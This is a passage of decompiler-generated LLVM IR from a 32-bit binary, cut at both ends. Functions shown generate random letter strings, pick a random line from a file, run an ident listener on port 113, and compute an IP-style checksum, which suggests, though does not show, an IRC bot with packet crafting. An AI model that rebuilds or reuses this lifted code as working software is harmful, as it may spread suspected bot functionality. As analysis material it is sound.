  br label %dec_label_pc_8048452

dec_label_pc_8048421:                             ; preds = %dec_label_pc_8048401
  %v1_8048421 = call i32 @function_804e3b8(i32 %tmp)
  %v0_8048428 = load i64, i64* @global_var_8055a4c.12, align 8
  %sext = mul i64 %v0_8048428, 4294967296
  %v5_804842d = sdiv i64 %sext, 4294967296
  %v6_8048437 = zext i32 %v1_8048421 to i64
  %v14_8048437 = urem i64 %v6_8048437, %v5_804842d
  %v15_8048437 = trunc i64 %v14_8048437 to i32
  %v0_804843a = load i8*, i8** @global_var_8055a48.11, align 4
  %v1_804843a = ptrtoint i8* %v0_804843a to i32
  %v2_804843f = add i32 %v15_8048437, 1
  %v1_8048442 = add i32 %v2_804843f, %v1_804843a
  %v2_8048447 = call i32 @function_804d117(i32 %v1_8048442)
  br label %dec_label_pc_8048452

dec_label_pc_8048452:                             ; preds = %dec_label_pc_804840b, %dec_label_pc_80483f7, %dec_label_pc_8048421
  %stack_var_-8.0 = phi i32 [ %v2_8048447, %dec_label_pc_8048421 ], [ %v2_8048414, %dec_label_pc_804840b ], [ %v1_80483f7, %dec_label_pc_80483f7 ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @function_804d117, { 1, 0 }
  uselistorder label %dec_label_pc_8048452, { 2, 0, 1 }
}

define i32 @function_8048457(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048457:
  %v4_804847f = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847f

dec_label_pc_8048460:                             ; preds = %dec_label_pc_80484a1, %dec_label_pc_804847f
  %v3_8048471 = call i32 @_strlen(i8* %arg1)
  %v6_8048478 = add i32 %v4_804847f, %v3_8048471
  %v1_804847b = add i32 %v6_8048478, -1
  %v1_804847c = inttoptr i32 %v1_804847b to i8*
  store i8 0, i8* %v1_804847c, align 1
  br label %dec_label_pc_804847f

dec_label_pc_804847f:                             ; preds = %dec_label_pc_8048457, %dec_label_pc_8048460
  %v3_8048490 = call i32 @_strlen(i8* %arg1)
  %v6_8048497 = add i32 %v4_804847f, %v3_8048490
  %v1_804849a = add i32 %v6_8048497, -1
  %v1_804849b = inttoptr i32 %v1_804849a to i8*
  %v2_804849b = load i8, i8* %v1_804849b, align 1
  %v10_804849d = icmp eq i8 %v2_804849b, 13
  br i1 %v10_804849d, label %dec_label_pc_8048460, label %dec_label_pc_80484a1

dec_label_pc_80484a1:                             ; preds = %dec_label_pc_804847f
  %v3_80484b2 = call i32 @_strlen(i8* %arg1)
  %v6_80484b9 = add i32 %v4_804847f, %v3_80484b2
  %v1_80484bc = add i32 %v6_80484b9, -1
  %v1_80484bd = inttoptr i32 %v1_80484bc to i8*
  %v2_80484bd = load i8, i8* %v1_80484bd, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bd, 10
  br i1 %v11_80484bf, label %dec_label_pc_8048460, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a1
  %v1_80484c8 = sext i8 %v2_80484bd to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i32 %v4_804847f, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847f, { 1, 0 }
}

define i32 @function_80484c9() local_unnamed_addr {
dec_label_pc_80484c9:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  %v1_80484d5 = call i32 @function_804e3b8(i32 %v0_80484ce)
  %v2_80484e5 = ashr i32 %v1_80484d5, 31
  %v2_80484e8 = zext i32 %v1_80484d5 to i64
  %v4_80484e8 = zext i32 %v2_80484e5 to i64
  %v5_80484e8 = mul nuw i64 %v4_80484e8, 4294967296
  %v6_80484e8 = or i64 %v5_80484e8, %v2_80484e8
  %v10_80484e8 = srem i64 %v6_80484e8, 5
  %v11_80484e8 = trunc i64 %v10_80484e8 to i32
  %v1_80484ec = add i32 %v11_80484e8, 4
  %v1_80484f5 = add i32 %v11_80484e8, 5
  %v2_80484fa = call i32 @function_804d73a(i32 %v1_80484f5)
  %tmp21 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_80484fa, i32* %tmp21, align 4
  %tmp22 = inttoptr i32 %v2_80484fa to i8*
  store i32 %v2_80484fa, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048513 = and i32 %v2_80484fa, -256
  store i32 %v1_8048513, i32* @eax, align 4
  %v5_8048515 = call i8* @_memset(i8* %tmp22, i32 %v1_8048513, i32 %v1_80484f5)
  %v3_8048524 = call i32 @function_804b5d0(i32 ptrtoint ([16 x i8]* @global_var_8051e90.14 to i32), i32 ptrtoint (i32* @global_var_8051e8e.13 to i32))
  store i32 %v3_8048524, i32* @eax, align 4
  %v4_804852f = icmp eq i32 %v3_8048524, 0
  %v1_8048533 = icmp eq i1 %v4_804852f, false
  br i1 %v1_8048533, label %dec_label_pc_8048572, label %dec_label_pc_8048565.preheader

dec_label_pc_8048565.preheader:                   ; preds = %dec_label_pc_80484c9
  %v5_804856b31 = icmp sgt i32 %v1_80484ec, 0
  br i1 %v5_804856b31, label %dec_label_pc_804853e, label %dec_label_pc_804862b

dec_label_pc_804853e:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader
  %v4_8048543 = phi i8* [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %storemerge32 = phi i32 [ 0, %dec_label_pc_8048565.preheader ], [ %v4_8048562, %dec_label_pc_804853e ]
  store i32 %storemerge32, i32* @eax, align 4
  %v5_8048543 = ptrtoint i8* %v4_8048543 to i32
  %v6_8048543 = add i32 %v5_8048543, %storemerge32
  store i32 %v6_8048543, i32* @ebx, align 4
  %v1_8048546 = call i32 @function_804e3b8(i32 %storemerge32)
  %v2_8048556 = ashr i32 %v1_8048546, 31
  %v2_8048559 = zext i32 %v1_8048546 to i64
  %v4_8048559 = zext i32 %v2_8048556 to i64
  %v5_8048559 = mul nuw i64 %v4_8048559, 4294967296
  %v6_8048559 = or i64 %v5_8048559, %v2_8048559
  %v10_8048559 = srem i64 %v6_8048559, 26
  %v11_8048559 = trunc i64 %v10_8048559 to i8
  %v1_804855d = add i8 %v11_8048559, 65
  %v2_8048560 = load i32, i32* @ebx, align 4
  %v3_8048560 = inttoptr i32 %v2_8048560 to i8*
  store i8 %v1_804855d, i8* %v3_8048560, align 1
  %v4_8048562 = add nuw nsw i32 %storemerge32, 1
  %exitcond33 = icmp eq i32 %v4_8048562, %v1_80484ec
  %v3_804862b.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond33, label %dec_label_pc_804862b, label %dec_label_pc_804853e

dec_label_pc_8048572:                             ; preds = %dec_label_pc_80484c9
  %v1_8048572 = call i32 @function_804e3b8(i32 %v3_8048524)
  store i32 %v1_8048572, i32* @eax, align 4
  store i32 %v1_8048572, i32* @ebx, align 4
  %v1_8048579 = call i32 @function_804e3b8(i32 %tmp6)
  %v2_8048579 = sext i32 %v1_8048579 to i64
  %v0_804857e = load i32, i32* @ebx, align 4
  %v3_8048580 = sext i32 %v0_804857e to i64
  %v5_8048580 = mul nsw i64 %v3_8048580, %v2_8048579
  %v6_8048580 = trunc i64 %v5_8048580 to i32
  %v2_804858c = ashr i32 %v6_8048580, 31
  %v2_804858f = and i64 %v5_8048580, 4294967295
  %v4_804858f = zext i32 %v2_804858c to i64
  %v5_804858f = mul nuw i64 %v4_804858f, 4294967296
  %v6_804858f = or i64 %v5_804858f, %v2_804858f
  %v10_804858f = srem i64 %v6_804858f, 45402
  %v11_804858f = trunc i64 %v10_804858f to i32
  store i32 %v11_804858f, i32* @edx, align 4
  %v1_8048593 = add i32 %v11_804858f, 1
  %v2_80485ab = ptrtoint i32* %stack_var_-1060 to i32
  %tmp23 = bitcast i32* %stack_var_-1060 to i8*
  %v5_80485c327 = icmp sgt i32 %v1_8048593, 0
  br i1 %v5_80485c327, label %dec_label_pc_80485a0, label %dec_label_pc_80485c5

dec_label_pc_80485a0:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  %storemerge428 = phi i32 [ %v4_80485ba, %dec_label_pc_80485a0 ], [ 0, %dec_label_pc_8048572 ]
  %v4_80485b2 = call i32 @function_804c93c(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v4_80485ba = add nuw nsw i32 %storemerge428, 1
  %exitcond = icmp eq i32 %v4_80485ba, %v1_8048593
  br i1 %exitcond, label %dec_label_pc_80485c5, label %dec_label_pc_80485a0

dec_label_pc_80485c5:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  store i32 %v2_80485ab, i32* @edx, align 4
  %v5_80485d9 = call i32 @function_804ce60(i8* %tmp23, i32 0, i32 1024)
  %v4_80485f3 = call i32 @function_804c93c(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v2_8048602 = call i32 @function_8048457(i8* %tmp23)
  store i32 %v2_80484fa, i32* @eax, align 4
  store i32 %v2_80484fa, i32* @edi, align 4
  store i32 %v2_80485ab, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804861b = call i8* @_memcpy(i8* %tmp22, i8* %tmp23, i32 %v1_80484ec)
  %v8_804861b = ptrtoint i8* %v7_804861b to i32
  store i32 %v8_804861b, i32* @ecx, align 4
  %tmp24 = inttoptr i32 %v3_8048524 to i16*
  %v3_8048623 = call i32 @function_804b4c4(i16* %tmp24)
  br label %dec_label_pc_804862b

dec_label_pc_804862b:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader, %dec_label_pc_80485c5
  %v3_804862b = phi i8* [ %tmp22, %dec_label_pc_80485c5 ], [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %v4_804862b = ptrtoint i8* %v3_804862b to i32
  ret i32 %v4_804862b

; uselistorder directives
  uselistorder i32 %v4_80485ba, { 1, 0 }
  uselistorder i8* %tmp23, { 2, 1, 0 }
  uselistorder i32 %v2_80485ab, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8048562, { 1, 0 }
  uselistorder i32 %storemerge32, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8048524, { 2, 1, 0, 3, 4, 5 }
  uselistorder i8* %tmp22, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_80484f5, { 1, 0 }
  uselistorder i32 %v1_80484ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804862b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80485c5, { 1, 0 }
  uselistorder label %dec_label_pc_80485a0, { 1, 0 }
}

define i32 @function_8048636() local_unnamed_addr {
dec_label_pc_8048636:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_8048649 = call i32 @function_804d6e8(i32 2, i32 1, i32 0)
  %v13_8048654 = icmp eq i32 %v3_8048649, -1
  br i1 %v13_8048654, label %dec_label_pc_8048873, label %dec_label_pc_804865e

dec_label_pc_804865e:                             ; preds = %dec_label_pc_8048636
  store i32 2, i32* %stack_var_-52, align 4
  %v1_8048669 = call i32 @function_804d0f8(i32 113)
  %v2_804867c = ptrtoint i32* %stack_var_-52 to i32
  %v3_804869b = call i32 @function_804d5b8(i32 %v3_8048649, i32 %v2_804867c, i32 16)
  %v10_80486a3 = icmp eq i32 %v3_804869b, -1
  br i1 %v10_80486a3, label %dec_label_pc_8048873, label %dec_label_pc_80486ac

dec_label_pc_80486ac:                             ; preds = %dec_label_pc_804865e
  %v2_80486b4 = call i32 @function_804d610(i32 %v3_8048649, i32 1)
  %v10_80486bc = icmp eq i32 %v2_80486b4, -1
  br i1 %v10_80486bc, label %dec_label_pc_8048873, label %dec_label_pc_80486c5

dec_label_pc_80486c5:                             ; preds = %dec_label_pc_80486ac
  %v0_80486c5 = call i32 @function_804b2ec()
  %v1_80486ca = icmp eq i32 %v0_80486c5, 0
  br i1 %v1_80486ca, label %dec_label_pc_8048873, label %dec_label_pc_80486d2

dec_label_pc_80486d2:                             ; preds = %dec_label_pc_80486c5
  store i32 16, i32* %stack_var_-36, align 4
  %v2_80486d9 = ptrtoint i32* %stack_var_-36 to i32
  %v2_80486dc = ptrtoint i32* %stack_var_-68 to i32
  %v3_80486e7 = call i32 @function_804d58c(i32 %v3_8048649, i32 %v2_80486dc, i32 %v2_80486d9)
  store i32 %v3_80486e7, i32* @eax, align 4
  %v4_80486f2 = add i32 %v3_80486e7, 1
  %v13_80486f2 = icmp eq i32 %v4_80486f2, 0
  %v1_80486f6 = icmp eq i1 %v13_80486f2, false
  br i1 %v1_80486f6, label %dec_label_pc_8048702.preheader, label %dec_label_pc_80486f8

dec_label_pc_80486f8:                             ; preds = %dec_label_pc_80486d2
  %v1_80486fd = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048702.preheader

dec_label_pc_8048702.preheader:                   ; preds = %dec_label_pc_80486f8, %dec_label_pc_80486d2
  %v2_804870c = ptrtoint i32* %stack_var_-1228 to i32
  %tmp33 = bitcast i32* %stack_var_-1228 to i8*
  %v2_8048720 = udiv i32 %v3_80486e7, 32
  %v1_8048726 = urem i32 %v3_80486e7, 32
  %v9_8048729 = shl i32 1, %v1_8048726
  %v2_804874e = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048785 = mul nuw nsw i32 %v2_8048720, 4
  %v3_8048785 = add nsw i32 %v2_8048785, -1224
  br label %dec_label_pc_8048702

dec_label_pc_8048702:                             ; preds = %dec_label_pc_8048702.preheader, %dec_label_pc_8048777
  store i32 %v2_804870c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048713 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8048729 = load i32, i32* @ebp, align 4
  %v4_8048729 = add i32 %v3_8048785, %v0_8048729
  %v5_8048729 = inttoptr i32 %v4_8048729 to i32*
  %v6_8048729 = load i32, i32* %v5_8048729, align 4
  %v12_8048729 = or i32 %v6_8048729, %v9_8048729
  store i32 %v12_8048729, i32* %v5_8048729, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_8048761 = call i32 @function_804b3d8(i32 %v4_80486f2, i32 %v2_804870c, i32 0, i32 0, i32 %v2_804874e)
  store i32 %v6_8048761, i32* @eax, align 4
  %v2_8048769 = icmp slt i32 %v6_8048761, 0
  %v1_804876b = icmp eq i1 %v2_8048769, false
  br i1 %v1_804876b, label %dec_label_pc_8048777, label %dec_label_pc_804876d

dec_label_pc_804876d:                             ; preds = %dec_label_pc_8048702
  %v1_8048772 = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_8048702, %dec_label_pc_804876d
  %v0_8048785 = load i32, i32* @ebp, align 4
  %v4_8048785 = add i32 %v3_8048785, %v0_8048785
  %v5_8048785 = inttoptr i32 %v4_8048785 to i32*
  %v6_8048785 = load i32, i32* %v5_8048785, align 4
  %v10_8048785 = and i32 %v6_8048785, %v9_8048729
  %v11_8048785 = icmp ne i32 %v10_8048785, 0
  %v4_8048790 = icmp eq i1 %v11_8048785, false
  %v1_8048792 = icmp eq i1 %v4_8048790, false
  br i1 %v1_8048792, label %dec_label_pc_8048799, label %dec_label_pc_8048702

dec_label_pc_8048799:                             ; preds = %dec_label_pc_8048777
  %v2_80487a0 = ptrtoint i32* %stack_var_-1092 to i32
  %v5_80487aa = call i32 @function_804d634(i32 %v3_80486e7, i32 %v2_80487a0, i32 1024, i32 0)
  store i32 %v5_80487aa, i32* @eax, align 4
  %tmp34 = icmp slt i32 %v5_80487aa, 1
  br i1 %tmp34, label %dec_label_pc_80487c1, label %dec_label_pc_80487bb

dec_label_pc_80487bb:                             ; preds = %dec_label_pc_8048799
  %v7_80487bf = icmp sgt i32 %v5_80487aa, 19
  br i1 %v7_80487bf, label %dec_label_pc_80487c1, label %dec_label_pc_80487cb

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_8048799
  %v1_80487c6 = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_80487cb

dec_label_pc_80487cb:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_80487c1
  %v0_80487ce = load i32, i32* @ebp, align 4
  %v2_80487ce = add i32 %v5_80487aa, -1088
  %v3_80487ce = add i32 %v2_80487ce, %v0_80487ce
  %v4_80487ce = inttoptr i32 %v3_80487ce to i8*
  store i8 0, i8* %v4_80487ce, align 1
  %v0_80487da = load i32, i32* @ebp, align 4
  %v2_80487da = add i32 %v5_80487aa, -1089
  %v3_80487da = add i32 %v2_80487da, %v0_80487da
  %v4_80487da = inttoptr i32 %v3_80487da to i8*
  %v5_80487da = load i8, i8* %v4_80487da, align 1
  %v10_80487e1 = icmp eq i8 %v5_80487da, 10
  br i1 %v10_80487e1, label %dec_label_pc_80487f4, label %dec_label_pc_80487e5

dec_label_pc_80487e5:                             ; preds = %dec_label_pc_80487cb
  %v5_80487e9 = load i8, i8* %v4_80487da, align 1
  %v10_80487f0 = icmp eq i8 %v5_80487e9, 13
  %v1_80487f2 = icmp eq i1 %v10_80487f0, false
  br i1 %v1_80487f2, label %dec_label_pc_8048800, label %dec_label_pc_80487f4

dec_label_pc_80487f4:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487cb
  store i8 0, i8* %v4_80487da, align 1
  %v0_8048806.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8048800

dec_label_pc_8048800:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487f4
  %v0_8048828 = phi i32 [ %v0_80487da, %dec_label_pc_80487e5 ], [ %v0_8048806.pre, %dec_label_pc_80487f4 ]
  %v2_8048806 = add i32 %v5_80487aa, -1090
  %v3_8048806 = add i32 %v2_8048806, %v0_8048828
  %v4_8048806 = inttoptr i32 %v3_8048806 to i8*
  %v5_8048806 = load i8, i8* %v4_8048806, align 1
  %v10_804880d = icmp eq i8 %v5_8048806, 10
  br i1 %v10_804880d, label %dec_label_pc_8048822, label %dec_label_pc_8048811

dec_label_pc_8048811:                             ; preds = %dec_label_pc_8048800
  %v5_8048817 = load i8, i8* %v4_8048806, align 1
  %v10_804881e = icmp eq i8 %v5_8048817, 13
  %v1_8048820 = icmp eq i1 %v10_804881e, false
  br i1 %v1_8048820, label %dec_label_pc_8048830, label %dec_label_pc_8048822

dec_label_pc_8048822:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048800
  store i8 0, i8* %v4_8048806, align 1
  br label %dec_label_pc_8048830

dec_label_pc_8048830:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048822
  %v3_8048845 = call i32 @function_80482b2(i32 %v3_80486e7, i32 ptrtoint ([25 x i8]* @global_var_8051ea0.16 to i32))
  %v1_8048853 = call i32 @function_804b2bc(i32 %v3_80486e7)
  %v1_8048861 = call i32 @function_804b2bc(i32 %v3_8048649)
  store i32 %v1_8048861, i32* @eax, align 4
  %v1_804886e = call i32 @function_804e884(i32 0)
  br label %dec_label_pc_8048873

dec_label_pc_8048873:                             ; preds = %dec_label_pc_80486c5, %dec_label_pc_80486ac, %dec_label_pc_804865e, %dec_label_pc_8048636, %dec_label_pc_8048830
  %v0_8048877 = phi i32 [ 0, %dec_label_pc_80486c5 ], [ -1, %dec_label_pc_80486ac ], [ -1, %dec_label_pc_804865e ], [ -1, %dec_label_pc_8048636 ], [ %v1_804886e, %dec_label_pc_8048830 ]
  ret i32 %v0_8048877

; uselistorder directives
  uselistorder i32 %v5_80487aa, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_8048785, { 1, 0 }
  uselistorder i32 %v3_80486e7, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_8048649, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ()* @function_804b2ec, { 1, 0 }
  uselistorder label %dec_label_pc_8048873, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048830, { 1, 0 }
  uselistorder label %dec_label_pc_8048800, { 1, 0 }
  uselistorder label %dec_label_pc_80487cb, { 1, 0 }
  uselistorder label %dec_label_pc_8048777, { 1, 0 }
  uselistorder label %dec_label_pc_8048702, { 1, 0 }
}

define i32 @function_8048878(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048878:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048878 = load i32, i32* @ebp, align 4
  store i32 %v0_8048878, i32* %stack_var_-4, align 4
  %v4_8048878 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048878, i32* @ebp, align 4
  %v4_804887e = icmp eq i32 %arg2, 0
  %v1_8048882 = icmp eq i1 %v4_804887e, false
  br i1 %v1_8048882, label %dec_label_pc_804888d, label %dec_label_pc_8048884

dec_label_pc_8048884:                             ; preds = %dec_label_pc_8048878
  br label %dec_label_pc_80488b7

dec_label_pc_804888d:                             ; preds = %dec_label_pc_8048878
  %v4_804888d = add i32 %arg2, -1
  %v12_804888d = icmp eq i32 %v4_804888d, 0
  %v1_8048891 = icmp eq i1 %v12_804888d, false
  br i1 %v1_8048891, label %dec_label_pc_804889b, label %dec_label_pc_8048893

dec_label_pc_8048893:                             ; preds = %dec_label_pc_804888d
  %v4_8048893 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_804889b:                             ; preds = %dec_label_pc_804888d
  %v4_80488a6 = call i32 @function_8048878(i64 %arg1, i32 %v4_804888d)
  %v6_80488b0 = sext i32 %v4_80488a6 to i64
  %v8_80488b0 = mul nsw i64 %v6_80488b0, %arg1
  %v9_80488b0 = trunc i64 %v8_80488b0 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_80488b7:                             ; preds = %dec_label_pc_8048893, %dec_label_pc_8048884, %dec_label_pc_804889b
  %v3_80488b7.off0 = phi i32 [ %v4_8048893, %dec_label_pc_8048893 ], [ 1, %dec_label_pc_8048884 ], [ %v9_80488b0, %dec_label_pc_804889b ]
  ret i32 %v3_80488b7.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80488b7, { 2, 0, 1 }
}

define i32 @function_80488bc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80488bc:
  %v0_80488bc = load i32, i32* @ebp, align 4
  %v4_80488f323 = add i32 %arg2, -1
  %v9_80488f324 = sub i32 0, %arg2
  %v10_80488f325 = and i32 %arg2, %v9_80488f324
  %v11_80488f326 = icmp slt i32 %v10_80488f325, 0
  %v12_80488f327 = icmp eq i32 %v4_80488f323, 0
  %v13_80488f328 = icmp slt i32 %v4_80488f323, 0
  %v3_80488f729 = icmp eq i1 %v13_80488f328, %v11_80488f326
  %v4_80488f730 = icmp eq i1 %v12_80488f327, false
  %v5_80488f731 = and i1 %v4_80488f730, %v3_80488f729
  br i1 %v5_80488f731, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488dd:                             ; preds = %dec_label_pc_80488bc, %dec_label_pc_80488dd
  %stack_var_-24.034 = phi i16 [ %v6_80488e8, %dec_label_pc_80488dd ], [ 0, %dec_label_pc_80488bc ]
  %stack_var_-28.033 = phi i16* [ %v23_80488eb, %dec_label_pc_80488dd ], [ %arg1, %dec_label_pc_80488bc ]
  %v3_80488ef32 = phi i32 [ %v4_80488ef, %dec_label_pc_80488dd ], [ %arg2, %dec_label_pc_80488bc ]
  %v4_80488dd = ptrtoint i16* %stack_var_-28.033 to i32
  %v2_80488e0 = load i16, i16* %stack_var_-28.033, align 2
  %v6_80488e8 = add i16 %v2_80488e0, %stack_var_-24.034
  %v5_80488eb = add i32 %v4_80488dd, 2
  %v23_80488eb = inttoptr i32 %v5_80488eb to i16*
  %v4_80488ef = add i32 %v3_80488ef32, -2
  %v4_80488f3 = add i32 %v3_80488ef32, -3
  %v9_80488f3 = sub i32 2, %v3_80488ef32
  %v10_80488f3 = and i32 %v4_80488ef, %v9_80488f3
  %v11_80488f3 = icmp slt i32 %v10_80488f3, 0
  %v12_80488f3 = icmp eq i32 %v4_80488f3, 0
  %v13_80488f3 = icmp slt i32 %v4_80488f3, 0
  %v3_80488f7 = icmp eq i1 %v13_80488f3, %v11_80488f3
  %v4_80488f7 = icmp eq i1 %v12_80488f3, false
  %v5_80488f7 = and i1 %v4_80488f7, %v3_80488f7
  br i1 %v5_80488f7, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488f9:                             ; preds = %dec_label_pc_80488dd, %dec_label_pc_80488bc
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %dec_label_pc_80488bc ], [ %v23_80488eb, %dec_label_pc_80488dd ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_80488bc ], [ %v6_80488e8, %dec_label_pc_80488dd ]
  %v4_80488f7.lcssa = phi i1 [ %v4_80488f730, %dec_label_pc_80488bc ], [ %v4_80488f7, %dec_label_pc_80488dd ]
  br i1 %v4_80488f7.lcssa, label %dec_label_pc_8048915, label %dec_label_pc_80488ff

dec_label_pc_80488ff:                             ; preds = %dec_label_pc_80488f9
  %v4_8048902 = ptrtoint i16* %stack_var_-28.0.lcssa to i32
  %v1_8048905 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_8048905 = load i8, i8* %v1_8048905, align 1
  %v3_8048905 = zext i8 %v2_8048905 to i32
  %v5_8048905 = and i32 %v4_8048902, -256
  %v6_8048905 = or i32 %v3_8048905, %v5_8048905
  %v4_804890910 = urem i32 %v6_8048905, 65536
  %v4_804891241 = zext i16 %stack_var_-24.0.lcssa to i32
  %v6_8048912 = add nuw nsw i32 %v4_804890910, %v4_804891241
  %v26_8048912 = trunc i32 %v6_8048912 to i16
  br label %dec_label_pc_8048915

dec_label_pc_8048915:                             ; preds = %dec_label_pc_80488f9, %dec_label_pc_80488ff
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488f9 ], [ %v26_8048912, %dec_label_pc_80488ff ]
  %v4_8048915 = sext i16 %stack_var_-24.1 to i32
  %v2_8048918 = sdiv i32 %v4_8048915, 65536
  %v2_804891f = add nsw i32 %v2_8048918, %v4_8048915
  %sext4 = mul i32 %v2_804891f, 65536
  %v2_8048927 = ashr i32 %sext4, 31
  %v6_804892a12 = mul nsw i32 %v2_8048927, 65536
  %v4_80489241113 = add i32 %v6_804892a12, %sext4
  %v4_804892d22 = udiv i32 %v4_80489241113, 65536
  %v1_804893a = xor i32 %v4_804892d22, 65535
  store i32 %v0_80488bc, i32* @ebp, align 4
  ret i32 %v1_804893a

; uselistorder directives
  uselistorder i32 %sext4, { 1, 0 }
  uselistorder i32 %v4_8048915, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488f3, { 1, 0 }
  uselistorder i32 %v4_80488ef, { 1, 0 }
  uselistorder label %dec_label_pc_8048915, { 1, 0 }
  uselistorder label %dec_label_pc_80488dd, { 1, 0 }
}

define i32 @function_8048941(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048941:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-5244 = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %v5_804894c = icmp ult i32* %stack_var_-5228, inttoptr (i32 12 to i32*)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 %arg2, i32* %stack_var_-5244, align 4
  %v7_804894f = ptrtoint i32* %stack_var_-5244 to i32
  %v1_8048952 = call i32 @function_8048309(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804895a = icmp eq i32 %v1_8048952, 0
  %v1_804895c = icmp eq i1 %v1_804895a, false
  br i1 %v1_804895c, label %dec_label_pc_8048e1a, label %dec_label_pc_8048962

dec_label_pc_8048962:                             ; preds = %dec_label_pc_8048941
  %v12_8048946 = ptrtoint i32* %stack_var_-5228 to i32
  %v4_8048962 = add i32 %arg3, -1
  %v8_8048962 = icmp eq i32 %arg3, 0
  %v9_8048962 = sub i32 0, %arg3
  %v10_8048962 = and i32 %arg3, %v9_8048962
  %v11_8048962 = icmp slt i32 %v10_8048962, 0
  store i1 %v8_8048962, i1* %cf.global-to-local, align 1
  %v12_8048962 = icmp eq i32 %v4_8048962, 0
  %v13_8048962 = icmp slt i32 %v4_8048962, 0
  %v3_8048966 = icmp eq i1 %v13_8048962, %v11_8048962
  %v4_8048966 = icmp eq i1 %v12_8048962, false
  %v5_8048966 = and i1 %v4_8048966, %v3_8048966
  br i1 %v5_8048966, label %dec_label_pc_8048988, label %dec_label_pc_8048968

dec_label_pc_8048968:                             ; preds = %dec_label_pc_8048962
  %v5_8048968 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048968, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_8048976 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_8051ebc.17 to i32))
  store i32 %v3_8048976, i32* @eax, align 4
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
